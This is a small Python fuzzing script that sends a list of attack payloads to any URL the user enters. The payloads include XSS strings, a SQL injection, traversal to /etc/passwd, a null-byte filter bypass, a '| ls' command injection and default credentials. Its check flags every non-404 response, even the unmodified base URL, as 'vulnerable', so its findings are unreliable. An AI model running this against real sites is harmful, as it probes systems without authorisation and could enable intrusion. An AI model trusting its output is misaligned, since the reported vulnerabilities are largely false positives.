import requests

# Get the target URL from the user with format instructions
print("Please enter the target URL in the following format: https://example.com")
base_url = input("Enter the target URL: ")

# List of common payloads to test
payloads = [
    "",  # Empty payload (test the base URL)
    "..%2f",  # URL-encoded directory traversal attempt
    "<script>alert('XSS')</script>",  # Basic XSS payload
    "' OR 1=1 --",  # SQL Injection attempt
    "><img src=x onerror=alert('XSS')>",  # Another XSS payload
    "admin",  # Common username for login attempts
    "password123",  # Common password for login attempts
    "../../../../etc/passwd",  # Linux /etc/passwd traversal
    "%00",  # Null byte to bypass security filters
    "| ls",  # Command injection attempt
]

# Function to fuzz the URL
def fuzz_url(url, payload):
    full_url = url + payload
    try:
        response = requests.get(full_url)
        # Check for unusual or vulnerable responses here
        if response.status_code != 404:
            print(f"Vulnerable URL found: {full_url}")
    except requests.exceptions.RequestException:
        pass  # Handle network errors

# Iterate through payloads and fuzz the URL
for payload in payloads:
    fuzz_url(base_url, payload)
